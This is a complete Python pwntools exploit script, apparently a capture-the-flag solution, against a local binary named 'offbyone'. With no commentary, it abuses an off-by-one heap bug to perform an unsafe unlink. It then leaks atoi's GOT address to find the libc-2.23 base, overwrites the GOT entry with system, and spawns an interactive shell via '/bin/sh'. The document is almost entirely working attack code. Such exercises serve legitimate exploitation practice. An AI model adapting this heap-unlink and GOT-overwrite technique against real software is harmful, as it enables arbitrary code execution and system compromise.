from pwn import *
from time import sleep

r=process('./offbyone')
elf=ELF('offbyone')

hijack=0x6020c0+0x18

def addN(size,content):
	r.sendlineafter('4:edit\n','1')
	r.sendlineafter('len\n',str(size))
	r.sendafter('data\n',content)
def delN(index):
	r.sendlineafter('4:edit\n','2')
	r.sendlineafter('id\n',str(index))
def showN(index):
	r.sendlineafter('4:edit\n','3')
	r.sendlineafter('id\n',str(index))
	leak=u64(r.recv(6).ljust(8,'\x00'))
	return leak
def editN(index,content):
	r.sendlineafter('4:edit\n','4')
	r.sendlineafter('id\n',str(index))
	r.sendafter('data\n',content)

addN(0xf0,'xxxxxxxx')#0
addN(0xf0,'yyyyyyyy')#1
addN(0xf0,'zzzzzzzz')#2
addN(0xf0,'00000000')#3
addN(0xf0,'1'*0xf0)#4
addN(0x80,'2'*0x80)#5
addN(0x80,'3'*0x80)#6
delN(3)
addN(0xf8,'0'*0xf8)#3
editN(3,p64(0x0)+p64(0xf0)+p64(hijack-0x18)+p64(hijack-0x10)+'0'*0xd0+p64(0xf0)+'\x00')
delN(4)
log.success('UNLINK SUCCESS')

editN(3,p64(elf.got['atoi']))
atoi_addr=showN(0)
log.success('LEAK SUCCESS -> LIBC VERSION CONFIRMED')
libc=ELF('libc-2.23.so')
libc_base=atoi_addr-libc.symbols['atoi']
log.success('LIBC BASE = '+str(hex(libc_base)))

editN(0,p64(libc_base+libc.symbols['system']))
r.recv()
r.sendline('/bin/sh\x00')
r.recv()
log.success('OVERWRITE GOT SUCCESS')
r.interactive()
